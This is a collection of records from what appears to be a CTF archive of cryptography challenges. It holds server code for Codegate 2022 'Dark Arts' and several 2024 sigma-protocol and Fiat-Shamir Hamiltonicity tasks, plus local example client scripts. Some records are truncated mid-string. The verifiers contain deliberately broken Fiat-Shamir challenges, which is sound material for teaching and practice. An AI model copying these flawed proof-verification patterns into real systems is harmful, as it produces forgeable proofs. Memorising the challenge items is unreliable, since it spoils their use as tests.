{"source": "ctf_archive", "path": "data\\ctf_archive\\CODEGATE2022_Dark_Arts\\server_files\\chal.py", "category": "crypto", "solution_code": "import os\nimport hashlib \nimport signal \n\nsignal.alarm(300)\n\ndef inner_product(u, v):\n    assert len(u) == len(v)\n    res = 0\n    for a, b in zip(u, v):\n        res += a * b\n    return res\n\ndef guess_mode(G):\n    while True:\n        idx = int(input())\n        if idx == 0:\n            x = int(input())\n            print(G.calc(x))\n        elif idx == 1:\n            mode = int(input())\n            if mode != G.mode:\n                exit()\n            else:\n                break\n        else:\n            exit()\n\ndef guess_key(G, l):\n    while True:\n        idx = int(input())\n        if idx == 0:\n            x = int(input())\n            print(G.func_gen(x))\n        elif idx == 1:\n            for i in range(l):\n                x = int(input())\n                if x != G.key[i]:\n                    exit()\n            break\n        else:\n            exit()\n\nclass Generator1:\n    def __init__(self):\n        seed = int.from_bytes(os.urandom(32), \"big\")\n        self.key = [0] * 256\n        for i in range(256):\n            self.key[i] = (seed >> i) & 1\n        self.mode = os.urandom(1)[0] & 1\n        \n        self.p = 2\n        self.q = 3\n\n        self.cache0 = {}\n        self.cache1 = {}\n        \n    def func_gen(self, x):\n        assert 0 <= x < (1 << 256)\n        if x in self.cache0.keys():\n            return self.cache0[x]\n        arr = [0] * 256\n        for i in range(256):\n            arr[i] = (x >> i) & 1\n        prod = inner_product(self.key, arr)\n        self.cache0[x] = (prod % self.p + prod % self.q) % self.p\n        return self.cache0[x]\n    \n    def func_random(self, x):\n        assert 0 <= x < (1 << 256)\n        if x in self.cache1.keys():\n            return self.cache1[x]\n        self.cache1[x] = os.urandom(1)[0] & 1\n        return self.cache1[x]\n    \n    def calc(self, x):\n        ret0 = self.func_gen(x)\n        ret1 = self.func_random(x)\n        if self.mode == 0:\n            return ret0\n        else:\n            return ret1\n\ndef challenge_generator_1():\n    print(\"Challenge 1\")\n    for _ in range(64):\n        G = Generator1()\n        guess_mode(G)\n\nclass Generator2:\n    def __init__(self):\n        seed = int.from_bytes(os.urandom(32), \"big\")\n        self.key = [0] * 256\n        for i in range(256):\n            self.key[i] = (seed >> i) & 1\n        self.mode = os.urandom(1)[0] & 1\n        \n        self.p = 5\n        self.q = 7\n\n        self.cache0 = {}\n        self.cache1 = {}\n    \n    def func_gen(self, x):\n        x = int.from_bytes(hashlib.sha256(str(x).encode()).digest(), \"big\")\n        if x in self.cache0.keys():\n            return self.cache0[x]\n        hashed = [0] * 256\n        for i in range(256):\n            hashed[i] = (x >> i) & 1\n        prod = inner_product(self.key, hashed)\n        self.cache0[x] = (prod % self.p + prod % self.q) % self.p\n        return self.cache0[x]\n    \n    def func_random(self, x):\n        x = int.from_bytes(hashlib.sha256(str(x).encode()).digest(), \"big\")\n        if x in self.cache1.keys():\n            return self.cache1[x]\n        self.cache1[x] = int.from_bytes(os.urandom(32), \"big\") % self.p\n        return self.cache1[x]\n    \n    def calc(self, x):\n        ret0 = self.func_gen(x)\n        ret1 = self.func_random(x)\n        if self.mode == 0:\n            return ret0\n        else:\n            return ret1\n\ndef challenge_generator_2():\n    print(\"Challenge 2\")\n    for _ in range(64):\n        G = Generator2()\n        guess_mode(G)\n\nclass Generator3:\n    def __init__(self):\n        seed = int.from_bytes(os.urandom(16), \"big\")\n        self.key = [0] * 64\n        for i in range(64):\n            self.key[i] = seed & 3\n            seed = seed >> 2\n\n        self.p = 2\n        self.q = 5\n    \n    def func_gen(self, x):\n        x = int.from_bytes(hashlib.sha256(str(x).encode()).digest(), \"big\")\n        hashed = [0] * 64\n        for i in range(64):\n            hashed[i] = x % self.q\n            x = x // self.q\n        prod = inner_product(self.key, hashed)\n        return (prod % self.q) % self.p\n\ndef challenge_generator_3():\n    print(\"Challenge 3\")\n    G = Generator3()\n    guess_key(G, 64)\n\nclass Generator4:\n    def __init__(self):\n        self.key = [0] * 16\n        for i in range(16):\n            self.key[i] = int.from_bytes(os.urandom(32), \"big\")\n\n        self.p = int.from_bytes(os.urandom(32), \"big\") + (1 << 256)\n        self.q = int.from_bytes(os.urandom(16), \"big\") + (1 << 128)\n        \n        print(self.p)\n        print(self.q)\n    \n    def func_gen(self, x):\n        x = hashlib.sha256(str(x).encode()).digest()\n        hashed = []\n        for _ in range(16):\n            hashed.append(int.from_bytes(x, \"big\"))\n            x = hashlib.sha256(x).digest()\n        prod = inner_product(self.key, hashed)\n        return (prod % self.p + prod % self.q) % self.p\n\ndef challenge_generator_4():\n    print(\"Challenge 4\")\n    G = Generator4()\n    guess_key(G, 16)\n\nchallenge_generator_1()\nchallenge_generator_2()\nchallenge_generator_3()\nchallenge_generator_4()\n\nflag = os.environ.get(\"FLA", "name": "chal"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\ch2024-ticket-maestro\\release_files\\example.py", "category": "crypto", "solution_code": "from pwn import *\nimport json \n\ndef redeemTicket(rem, ticket_proof):\n    payload = {\"Redeem\":{\"proof\":ticket_proof}}\n    print(json.dumps(payload))\n    rem.sendline(json.dumps(payload).encode())\n\n    resp = rem.readline().decode()\n    return resp\n\ndef getBalance(rem):\n    rem.sendline(b'\"Balance\"')\n    resp = rem.readline().decode()\n    return resp\n\ndef buyFlag(rem):\n    rem.sendline(b'\"BuyFlag\"')\n    resp = rem.readline().decode()\n    return resp\n\ndef buyTicket(rem):\n    rem.sendline(b'\"BuyTicket\"')\n    resp = rem.readline().decode()\n    return resp\n\ndef getProvingKey(rem):\n    rem.sendline(b'\"ProvingKey\"')\n    resp = rem.readline().decode()\n    return resp\n\ndef getVerifyingKey(rem):\n    rem.sendline(b'\"VerifyingKey\"')\n    resp = rem.readline().decode()\n    return resp\n\ndef getDigest(rem):\n    rem.sendline(b'\"Digest\"')\n    resp = rem.readline().decode()\n    return resp\n\nwith remote(\"127.0.0.1\", 1337) as rem:\n    welcome = rem.readline()\n    print(welcome)\n\n    balance = getBalance(rem)\n    print(f'balance = {balance}')\n    \n    digest = getDigest(rem)\n    print(f'digest = {digest}')\n\n    ticket = buyTicket(rem)\n    print(f'ticket = {ticket}')\n\n    balance = getBalance(rem)\n    print(f'balance = {balance}')\n\n    ticket_proof = json.loads(ticket)[\"Ticket\"][\"proof\"]\n    redeemed = redeemTicket(rem, ticket_proof)\n    print(f\"redeemed ticket = {redeemed}\")\n\n    redeemed = redeemTicket(rem, ticket_proof)\n    print(f\"redeemed ticket again = {redeemed}\")\n\n    balance = getBalance(rem)\n    print(f'balance = {balance}')\n\n    # vk = getVerifyingKey(rem)\n    # pk = getProvingKey(rem)\n\n    flag_response = buyFlag(rem)\n    \n    print(flag_response)\n", "name": "example"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\ch2024-sigma-or\\release_files\\chal.py", "category": "crypto", "solution_code": "../server_files/chal.py", "name": "chal"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\ch2024-sigma-or\\release_files\\params.py", "category": "crypto", "solution_code": "../server_files/params.py", "name": "params"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\ch2024-sigma-or\\server_files\\chal.py", "category": "crypto", "solution_code": "from enum import Flag\nimport random\nfrom params import p, q, g\nimport os\n\nFLAG = os.environ[\"FLAG\"].encode()\n\n# w,y for the relation `g^w = y mod p` we want to prove knowledge of\n# w = random.randint(0,q)\n# y = pow(g,w,p)\nw0 = 0x5a0f15a6a725003c3f65238d5f8ae4641f6bf07ebf349705b7f1feda2c2b051475e33f6747f4c8dc13cd63b9dd9f0d0dd87e27307ef262ba68d21a238be00e83\ny0 = 0x514c8f56336411e75d5fa8c5d30efccb825ada9f5bf3f6eb64b5045bacf6b8969690077c84bea95aab74c24131f900f83adf2bfe59b80c5a0d77e8a9601454e5\n# w1 = REDACTED\ny1 = 0x1ccda066cd9d99e0b3569699854db7c5cf8d0e0083c4af57d71bf520ea0386d67c4b8442476df42964e5ed627466db3da532f65a8ce8328ede1dd7b35b82ed617\nassert (y0%p) >= 1 and (y1%p) >= 1\nassert pow(y0, q, p) == 1 and pow(y1, q, p) == 1\n\n\ndef correctness():\n    print(\"Correctness!\")\n    print(f'Prove to me that you know either w0 or w1, where g^w0 = y0 mod p, g^w1 = y1 mod p')\n    # Send first round messages (a0) and (a1), for sigma protocols P1 and P2:\n    a0 = int(input(\"a0:\"))\n    a1 = int(input(\"a1:\"))\n\n    assert (a0%p) >= 1 and (a1%p) >= 1\n    assert pow(a0, q, p) == 1 and pow(a1, q, p) == 1\n\n    # Verifier sends a random challenge sampled from range(0, 2^t) where 2^t <= q\n    s = random.randint(0,2**511-1)\n    print(f'verifier sends s = {s}')\n\n    # Prover sends (e0,z0) and (e1,z1) such that (a0,e0,z0) and (a1,e1,z1) are satisfying transcripts and e0 xor e1 == s\n    e0 = int(input(\"e0:\"))\n    e1 = int(input(\"e1:\"))\n    z0 = int(input(\"z0:\"))\n    z1 = int(input(\"z1:\"))\n\n    # Verifier checks e0 xor e1 == s mod p\n    if not e0^e1 == s:\n        print(\"something went wrong with e0^e1 == s\")\n        exit()\n    # Verifier checks g^z0 = A0*h^e0 mod p\n    if not pow(g,z0,p) == (a0*pow(y0,e0,p)) % p:\n        print(\"something went wrong with b=0\")\n        exit()\n        # Verifier checks g^z1 = A1*h^e1 mod p\n    if not pow(g,z1,p) == (a1*pow(y1,e1,p)) % p:\n        print(\"something went wrong with verifying b=1 :(\")\n        exit()\n\n\ndef specialSoundness():\n    # w,y for the relation `g^w = y mod p` we want to prove knowledge of\n    w0 = random.randint(0,q)\n    y0 = pow(g,w0,p)\n    w1 = random.randint(0,q)\n    y1 = pow(g,w1,p)\n    assert (y0%p) >= 1 and (y1%p) >= 1\n    assert pow(y0, q, p) == 1 and pow(y1, q, p) == 1\n\n    print(f'i will now prove knowledge of w such that either g^w=y0 or g^w=y1 mod p')\n    print(f'y0 = {y0}')\n    print(f'y1 = {y1}')\n\n    # pick which one we are going to prove knowledge of\n    b = random.randint(0,1)\n    if b:\n        w0,y0,w1,y1 = w1,y1,w0,y0\n\n    # Special soundness!\n    print(\"Special Soundness!\")\n    # honestly run transcript 0\n    r0 = random.randint(0,q)\n    a0 = pow(g,r0,p)\n\n    # Simulate transcript 1\n    e1 = random.randint(0,2**511-1)\n    z1 = random.randint(0,q-1)\n    a1 = (pow(pow(y1,e1,p),-1,p) *pow(g,z1,p)) % p\n\n    # randomly sample s\n    s = random.randint(0,2**511-1)\n\n    # Complete transcript 0\n    e0 = s^e1\n    z0 = (r0 + e0*w0) % q\n\n    ### Lets REWIND the prover back to before it received s!\n    # We then recompute the e and z values with the new s, and print both transcripts\n    # randomly sample s\n    s2 = random.randint(0,2**511-1)\n\n    # Complete transcript 0\n    e2 = s2^e1\n    z2 = (r0 + e2*w0) % q\n\n    # if we swapped w1/w0 now we swap transcripts back\n    if b:\n        a0,a1,e0,e1,z0,z1 = a1,a0,e1,e0,z1,z0\n\n    print(f'transcript 1:')\n    print(f'a0 = {a0}')\n    print(f'a1 = {a1}')\n    print(f's = {s}')\n    print(f'e0 = {e0}')\n    print(f'e1 = {e1}')\n    print(f'z0 = {z0}')\n    print(f'z1 = {z1}')\n\n    # update correct values in second transcript\n    if b:\n        e1 = e2\n        z1 = z2\n    else:\n        e0 = e2\n        z0 = z2\n\n    print(f'transcript 2:')\n    print(f'a0 = {a0}')\n    print(f'a1 = {a1}')\n    print(f's* = {s2}')\n    print(f'e0* = {e0}')\n    print(f'e1* = {e1}')\n    print(f'z0* = {z0}')\n    print(f'z1* = {z1}')\n\n    wb = int(input(f'give me a witness!'))\n\n    if not ((wb == w0) or (wb == w1)):\n        print(\"you didn't recover the correct witness :(\")\n        exit()\n\n    print(\"Well done! You proved extraction!\")\n\ndef SHVZK():\n    print(f'Finally, show me you can simulate proofs!')\n\n    # w,y for the relation `g^w = y mod p` we want to prove knowledge of\n    w0 = random.randint(0,q)\n    y0 = pow(g,w0,p)\n    w1 = random.randint(0,q)\n    y1 = pow(g,w1,p)\n    assert (y0%p) >= 1 and (y1%p) >= 1\n    assert pow(y0, q, p) == 1 and pow(y1, q, p) == 1\n\n\n    s = random.randint(0,2**511-1)\n    print(f'y0 = {y0}')\n    print(f'y1 = {y1}')\n    print(f'give me satisfying transcript for s = {s}')\n\n    a0 = int(input(f'a0: '))\n    a1 = int(input(f'a1: '))\n    e0 = int(input(f'e0: '))\n    e1 = int(input(f'e1: '))\n    z0 = int(input(f'z0: '))\n    z1 = int(input(f'z1: '))\n\n    # Verifier checks e0 xor e1 == s mod p\n    if not e0^e1 == s:\n        print(\"something went wrong with e0^e1 == s\")\n        exit()\n    # Verifier checks g^w0 = A0*h^e0 mod p\n    if not pow(g,z0,p) == (a0*pow(y0,e0,p)) % p:\n        print(\"something went wrong with b=0\")\n        exit()\n        # Verifi", "name": "chal"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\ch2024-sigma-or\\server_files\\params.py", "category": "crypto", "solution_code": "# Diffie-Hellman group (512 bits)\n# p = 2*q + 1 where p,q are both prime, and 2 modulo p generates a group of order q\np = 0x1ed344181da88cae8dc37a08feae447ba3da7f788d271953299e5f093df7aaca987c9f653ed7e43bad576cc5d22290f61f32680736be4144642f8bea6f5bf55ef\nq = 0xf69a20c0ed4465746e1bd047f57223dd1ed3fbc46938ca994cf2f849efbd5654c3e4fb29f6bf21dd6abb662e911487b0f9934039b5f20a23217c5f537adfaaf7\ng = 2\n", "name": "params"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\ch2024-sigma-hamiltonicity2\\release_files\\chal.py", "category": "crypto", "solution_code": "../server_files/chal.py", "name": "chal"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\ch2024-sigma-hamiltonicity2\\release_files\\example.py", "category": "crypto", "solution_code": "from hamiltonicity import pedersen_commit, pedersen_open\nfrom hamiltonicity import commit_to_graph, open_graph, permute_graph\nfrom hamiltonicity import hash_committed_graph, testcycle\nfrom hamiltonicity import comm_params, get_r_vals\nimport json\nimport random\nfrom pwn import process\n\n\nnumrounds = 128\nLocalTest = True\n\n# Graph with Hamiltonian cycle (0,4) (4,2) (2,3) (3,1) (1,0)\n# You can use this locally to test correct proofs :)\nN = 5\ncycle = [(0,4), (4,2), (2,3), (3,1), (1,0)]\nG = [\n    [0,1,1,0,1],\n    [1,0,0,0,0],\n    [0,0,0,1,0],\n    [0,1,1,0,0],\n    [1,0,1,1,0]\n]   \n\n\ndef gen_A(G,N):\n    # commit to graph\n    A, openings = commit_to_graph(G, N)\n    # shuffle graph\n    permutation = [i for i in range(N)]\n    random.shuffle(permutation)\n    A_permuted = permute_graph(A,N,permutation)\n\n    assert G == open_graph(A,N,openings)\n    assert permute_graph(G,N,permutation) == open_graph(A_permuted,N, permute_graph(openings,N,permutation))\n    \n    return A_permuted, openings, permutation\n\n\n\n# example running locally. \n# Set LocalTest = True in the challenge file, then this should solve it for localflag ^^\nwith process([\"python3 chal.py\"], shell=True) as rem:\n    rem.recvuntil(b'prove to me that G has a hamiltonian cycle!')\n    FS_state = b''\n    A_vars = []\n    opening_vars = []\n    permutation_vars = []\n    for i in range(numrounds):\n        print(f\"starting round {i}\")\n        A_permuted, openings, permutation = gen_A(G,N)\n        A_vars.append(A_permuted)\n        opening_vars.append(openings)\n        permutation_vars.append(permutation)\n\n    for i in range(numrounds):\n        FS_state = hash_committed_graph(A_vars[i], FS_state, comm_params)\n    \n    challenge_bits = bin(int.from_bytes(FS_state, 'big'))[-numrounds:]\n\n    proofs = []\n\n    for i in range(numrounds):\n        print(f\"proving round {i}\")\n        challenge = int(challenge_bits[i])\n        A = A_vars[i]\n        opening = opening_vars[i]\n        permutation = permutation_vars[i]\n        challenge = int(challenge_bits[i])\n\n        if challenge:\n            print(\"challenge bit is 1\")\n            # permute the hamiltonian cycle indexes to open\n            permuted_cycle = []\n            for x in cycle:\n                permuted_cycle.append([permutation.index(x[0]), permutation.index(x[1])] )\n            \n            # get the ordered list of r values to open the commitments to 1 with\n            opening = get_r_vals(opening, N, cycle)\n            z = [permuted_cycle, opening]\n            proofs.append(json.dumps({\"A\" : A, \"z\": z}))\n\n        else:\n            print(\"challenge bit is 0\")\n            # permute openings\n            # print(opening)\n            # print(N)\n            # print(permutation)\n            openings = permute_graph(opening,N,permutation)\n            # print(opening)\n            # exit()\n            z = [permutation, openings]\n            proofs.append(json.dumps({\"A\" : A, \"z\": z}))\n\n    for i in range(numrounds):\n        rem.recvuntil(b\"send fiat shamir proof: \")\n        rem.sendline(proofs[i])\n        # resp = rem.readline()\n        # print(resp)\n\n    rem.interactive()\n", "name": "example"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\ch2024-sigma-hamiltonicity2\\release_files\\hamiltonicity.py", "category": "crypto", "solution_code": "../server_files/hamiltonicity.py", "name": "hamiltonicity"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\ch2024-sigma-hamiltonicity2\\server_files\\chal.py", "category": "crypto", "solution_code": "from hamiltonicity import pedersen_commit, pedersen_open\nfrom hamiltonicity import commit_to_graph, open_graph, permute_graph\nfrom hamiltonicity import hash_committed_graph, testcycle, check_graph\nfrom hamiltonicity import comm_params\nimport json\nimport os\n\nFLAG = os.environ[\"FLAG\"].encode()\n\nnumrounds = 128\nLocalTest = False\n\nif LocalTest:\n    # Graph with Hamiltonian cycle (0,4) (4,2) (2,3) (3,1) (1,0)\n    # You can use this locally to test correct proofs :)\n    N = 5\n    G = [\n        [0,1,1,0,1],\n        [1,0,0,0,0],\n        [0,0,0,1,0],\n        [0,1,1,0,0],\n        [1,0,1,1,0]\n    ]\n\nelse: \n    # Graph with no hamiltonian cycle\n    # Break the fiat shamir to convince the server this has a cycle to get the flag :)\n    N = 5\n    G = [\n        [0,0,1,0,0],\n        [1,0,0,0,0],\n        [0,1,0,0,0],\n        [0,0,0,0,1],\n        [0,0,0,1,0]\n    ]\n\n\n\n\nprint(f'prove to me that G has a hamiltonian cycle!')\n\n# 128 bit security\nFS_state = b''\n\nA_vals = []\nz_vals = []\nfor i in range(numrounds):\n    # send permuted commitment matrix\n    payload = json.loads(input(b\"send fiat shamir proof: \"))\n    A = payload[\"A\"]\n    z = payload[\"z\"]\n\n    check_graph(A,N)\n\n    A_vals.append(A)\n    z_vals.append(z)    \n\nprint(\"computing fiat shamir challenge\")\nfor i in range(numrounds):\n    FS_state = hash_committed_graph(A_vals[i], FS_state, comm_params)\n\nchallenge_bits = bin(int.from_bytes(FS_state, 'big'))[-numrounds:]\n\nfor i in range(numrounds):\n    print(f\"checking round {i}\")\n    challenge = int(challenge_bits[i])\n    print(f\"challenge bit is {challenge}\")\n    A = A_vals[i]\n    z = z_vals[i]\n    # Challenge bit is 1:\n    # You should open the hamiltonian path\n    # z = [cycle, openings of cycle]\n    if challenge:\n        cycle, openings = z\n        if not testcycle(A, N, cycle, openings):\n            print(\"your proof didn't verify :(\")\n            exit()\n        else:\n            print(\"accepted\")\n    \n    # challenge bit is 0:\n    # you should show permutation and open everything\n    # z = [permutation, openings of everything]\n    else:\n        permutation, openings = z\n        G_permuted = open_graph(A,N, openings)\n        G_test = permute_graph(G, N, permutation)\n        if G_permuted == G_test:\n            print(\"accepted\")\n        else:\n            print(\"your proof didn't verify :()\")\n            exit()\n    \n\n\nprint(\"you've convinced me it has a hamiltonian path! Cool!\")\nprint(FLAG)\n", "name": "chal"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\ch2024-sigma-hamiltonicity2\\server_files\\hamiltonicity.py", "category": "crypto", "solution_code": "import random\nfrom Crypto.Util.number import isPrime\nfrom hashlib import sha256\n\nP = 0x19dad539e2d348cc3ab07d51f2bb6491d1552aa8cf1db928920fd3d86946aed8805d2e279fa8632dd5fbab8aaf7df1069906b057cc785b7f191ef1b9b5da38cff2e7c64da17bb56a058707d9fd69e546a95e502e556a314c587c7ae36c3d1122e6954f5d81dd9239e02f61b045360187b4caeed271cec1919a0d8a39e855040cf\nq = 0xced6a9cf169a4661d583ea8f95db248e8aa9554678edc944907e9ec34a3576c402e9713cfd43196eafdd5c557bef8834c83582be63c2dbf8c8f78dcdaed1c67f973e326d0bddab502c383ecfeb4f2a354af28172ab518a62c3e3d71b61e8891734aa7aec0eec91cf017b0d8229b00c3da65776938e760c8cd06c51cf42a82067\n\n\n# Generate `h1,h2` to be a random element Z_P of order q\n# Unknown dlog relation is mask for the Pedersen Commitment\n\n# Hardcoded a random `h1,h2` value for ease of use\n# h1 = pow(random.randint(2,P-1),2,P)\n# h2 = pow(random.randint(2,P-1),2,P)\nh1 = 250335104192448110684442096964171969189371208477846978499544515755228857598805930673171509152681305793789903169450438090936970626429806187630240086681623358732517929314870247393468568111513100989768455673769015138136779312483203922847547169463972757664497001482465636402329003817055202840451714256443734563502\nh2 = 50837518481371967588098771977165879422445597094015682347125264774697010574110399136037637691883034517374621248070926110725252171239208140392324019115211573768989274797050961703999139947885402838647962534519882622024973824201026885393782961783980351898031905383197219266093119145616328556294476943229578292306\ncomm_params = P,q,h1,h2\n\n\n\n# Information theoretically hiding commitment scheme\ndef pedersen_commit(message, pedersen_params = comm_params):\n    P,q,h1,h2 = pedersen_params\n    r = random.randint(0,q)\n    commitment = (pow(h1,message,P) * pow(h2,r,P)) % P\n    return commitment, r\n\ndef pedersen_open(commitment,message,r, pedersen_params = comm_params):\n    P,q,h1,h2 = pedersen_params\n    if (commitment * pow(h1,-message,P) * pow(h2,-r,P) ) % P == 1:\n        return True\n    else:\n        return False\n\n# Given a graph, return an element-wise commitment to the graph\ndef commit_to_graph(G,N):\n    G2 = [[0 for _ in range(N)] for _ in range(N)]\n    openings = [[0 for _ in range(N)] for _ in range(N)]\n    for i in range(N):\n        for j in range(N):\n            v = G[i][j]\n            comm, r = pedersen_commit(v)\n            assert pedersen_open(comm,v,r)\n            G2[i][j] = comm\n            openings[i][j] = [v,r]\n    return G2, openings\n\ndef check_graph(G,N):\n    assert len(G) == N, \"G has wrong size\"\n    for r in G:\n        assert len(r) == N, \"G has wrong size\"\n    return True\n\n# Takes a commitment to a graph, and opens all the commitments to reveal the graph\ndef open_graph(G2,N, openings):\n    G = [[0 for _ in range(N)] for _ in range(N)]\n    for i in range(N):\n        for j in range(N):\n            v = G2[i][j]\n            m,r = openings[i][j]\n            assert pedersen_open(v, m, r)\n            G[i][j] = m\n    return G\n\n\n# Takes a commitment to a graph, and a claimed set of entries which should open a hamiltonian cycle\n# Returns True if the opened nodes form a hamiltonian cycle\ndef testcycle(graph, N, nodes, openings):\n    assert len(nodes) == N\n    from_list = [n[0] for n in nodes]\n    to_list = [n[1] for n in nodes]\n    for i in range(N):\n        assert i in from_list\n        assert i in to_list\n        assert nodes[i][1] == nodes[(i+1)%N][0]\n\n    for i in range(N):\n        src,dst = nodes[i]\n        r = openings[i]\n        # print(f'trying to open {src}->{dst} {r} {graph[src][dst]}')\n        assert pedersen_open(graph[src][dst], 1, r)\n    return True\n\n# Given a graph, and a permutation, shuffle the graph using the permutation\ndef permute_graph(G, N, permutation):\n    G_permuted = [[G[permutation[i]][permutation[j]] for j in range(N)] for i in range(N)]\n    return G_permuted\n\n# given a set of commitment private values, and a subset of these indexes\n# return a vector of the randomness needed to open the commitments.\ndef get_r_vals(openings,N, cycle):\n    rvals = []\n    for x in cycle:\n        m,r = openings[x[0]][x[1]]\n        rvals.append(r)\n    return rvals\n\n\n# Iterated Fiat Shamir, take previous state and current graph\ndef hash_committed_graph(G, state, comm_params):\n    fs_state = sha256(str(comm_params).encode())\n    fs_state.update(state)\n    first_message = \"\".join([str(x) for xs in G for x in xs])\n    fs_state.update(first_message.encode())\n    iterated_state = fs_state.digest()\n    return iterated_state \n", "name": "hamiltonicity"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\ch2024-sigma-hamiltonicity\\release_files\\chal.py", "category": "crypto", "solution_code": "../server_files/chal.py", "name": "chal"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\ch2024-sigma-hamiltonicity\\release_files\\example.py", "category": "crypto", "solution_code": "from hamiltonicity import pedersen_commit, pedersen_open\nfrom hamiltonicity import commit_to_graph, open_graph, permute_graph\nfrom hamiltonicity import hash_committed_graph, testcycle\nfrom hamiltonicity import comm_params, get_r_vals\nimport json\nimport random\nfrom pwn import process\n\n\nnumrounds = 128\nLocalTest = True\n\n# Graph with Hamiltonian cycle (0,4) (4,2) (2,3) (3,1) (1,0)\n# You can use this locally to test correct proofs :)\nN = 5\ncycle = [(0,4), (4,2), (2,3), (3,1), (1,0)]\nG = [\n    [0,1,1,0,1],\n    [1,0,0,0,0],\n    [0,0,0,1,0],\n    [0,1,1,0,0],\n    [1,0,1,1,0]\n]   \n\n\ndef gen_A(G,N):\n    # commit to graph\n    A, openings = commit_to_graph(G, N)\n    # shuffle graph\n    permutation = [i for i in range(N)]\n    random.shuffle(permutation)\n    A_permuted = permute_graph(A,N,permutation)\n\n    assert G == open_graph(A,N,openings)\n    assert permute_graph(G,N,permutation) == open_graph(A_permuted,N, permute_graph(openings,N,permutation))\n    \n    return A_permuted, openings, permutation\n\n\n\n# example running locally. \n# Set LocalTest = True in the challenge file, then this should solve it for localflag ^^\nwith process([\"python3 chal.py\"], shell=True) as rem:\n    rem.recvuntil(b'prove to me that G has a hamiltonian cycle!')\n    FS_state = b''\n\n    for i in range(numrounds):\n        print(f\"starting round {i}\")\n        A_permuted, openings, permutation = gen_A(G,N)\n        FS_state = hash_committed_graph(A_permuted, FS_state, comm_params)\n        # take one bit of hash as challenge\n        challenge = FS_state[-1] & 1\n\n        if challenge:\n            print(\"challenge bit is 1\")\n            # permute the hamiltonian cycle indexes to open\n            permuted_cycle = []\n            for x in cycle:\n                permuted_cycle.append([permutation.index(x[0]), permutation.index(x[1])] )\n            \n            # get the ordered list of r values to open the commitments to 1 with\n            openings = get_r_vals(openings, N, cycle)\n            z = [permuted_cycle, openings]\n            rem.recvuntil(b\"send fiat shamir proof: \")\n            rem.sendline(json.dumps({\"A\" : A_permuted, \"z\": z}))\n            resp = rem.readline()\n            print(resp)\n\n        else:\n            print(\"challenge bit is 0\")\n            # permute openings\n            openings = permute_graph(openings,N,permutation)\n            z = [permutation, openings]\n            rem.recvuntil(b\"send fiat shamir proof: \")\n            rem.sendline(json.dumps({\"A\" : A_permuted, \"z\": z}))\n            resp = rem.readline()\n            print(resp)\n    rem.interactive()\n", "name": "example"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\ch2024-sigma-hamiltonicity\\release_files\\hamiltonicity.py", "category": "crypto", "solution_code": "../server_files/hamiltonicity.py", "name": "hamiltonicity"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\ch2024-sigma-hamiltonicity\\server_files\\chal.py", "category": "crypto", "solution_code": "from hamiltonicity import pedersen_commit, pedersen_open\nfrom hamiltonicity import commit_to_graph, open_graph, permute_graph\nfrom hamiltonicity import hash_committed_graph, testcycle, check_graph\nfrom hamiltonicity import comm_params\nimport json\nimport os\n\nFLAG = os.environ[\"FLAG\"].encode()\n\nnumrounds = 128\nLocalTest = False\n\nif LocalTest:\n    # Graph with Hamiltonian cycle (0,4) (4,2) (2,3) (3,1) (1,0)\n    # You can use this locally to test correct proofs :)\n    N = 5\n    G = [\n        [0,1,1,0,1],\n        [1,0,0,0,0],\n        [0,0,0,1,0],\n        [0,1,1,0,0],\n        [1,0,1,1,0]\n    ]\n\nelse: \n    # Graph with no hamiltonian cycle\n    # Break the fiat shamir to convince the server this has a cycle to get the flag :)\n    N = 5\n    G = [\n        [0,0,1,0,0],\n        [1,0,0,0,0],\n        [0,1,0,0,0],\n        [0,0,0,0,1],\n        [0,0,0,1,0]\n    ]\n\n\n\n\nprint(f'prove to me that G has a hamiltonian cycle!')\n\n# 128 bit security\nFS_state = b''\nfor i in range(numrounds):\n    # send permuted commitment matrix\n    payload = json.loads(input(b\"send fiat shamir proof: \"))\n\n    A = payload[\"A\"]\n    z = payload[\"z\"]\n    check_graph(A,N)\n\n    FS_state = hash_committed_graph(A, FS_state, comm_params)\n    # take one bit of hash as challenge\n    challenge = FS_state[-1] & 1\n    \n    # Challenge bit is 1:\n    # You should open the hamiltonian path\n    # z = [cycle, openings of cycle]\n    if challenge:\n        cycle, openings = z\n        if not testcycle(A, N, cycle, openings):\n            print(\"your proof didn't verify :(\")\n            exit()\n        else:\n            print(\"accepted\")\n    \n    # challenge bit is 0:\n    # you should show permutation and open everything\n    # z = [permutation, openings of everything]\n    else:\n        permutation, openings = z\n        G_permuted = open_graph(A,N, openings)\n        G_test = permute_graph(G, N, permutation)\n        if G_permuted == G_test:\n            print(\"accepted\")\n        else:\n            print(\"your proof didn't verify :()\")\n            exit()\n    \n\n\nprint(\"you've convinced me it has a hamiltonian path! Cool!\")\nprint(FLAG)\n", "name": "chal"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\ch2024-sigma-hamiltonicity\\server_files\\hamiltonicity.py", "category": "crypto", "solution_code": "import random\nfrom Crypto.Util.number import isPrime\nfrom hashlib import sha256\n\nP = 0x19dad539e2d348cc3ab07d51f2bb6491d1552aa8cf1db928920fd3d86946aed8805d2e279fa8632dd5fbab8aaf7df1069906b057cc785b7f191ef1b9b5da38cff2e7c64da17bb56a058707d9fd69e546a95e502e556a314c587c7ae36c3d1122e6954f5d81dd9239e02f61b045360187b4caeed271cec1919a0d8a39e855040cf\nq = 0xced6a9cf169a4661d583ea8f95db248e8aa9554678edc944907e9ec34a3576c402e9713cfd43196eafdd5c557bef8834c83582be63c2dbf8c8f78dcdaed1c67f973e326d0bddab502c383ecfeb4f2a354af28172ab518a62c3e3d71b61e8891734aa7aec0eec91cf017b0d8229b00c3da65776938e760c8cd06c51cf42a82067\n\n\n# Generate `h1,h2` to be a random element Z_P of order q\n# Unknown dlog relation is mask for the Pedersen Commitment\n\n# Hardcoded a random `h1,h2` value for ease of use\n# h1 = pow(random.randint(2,P-1),2,P)\n# h2 = 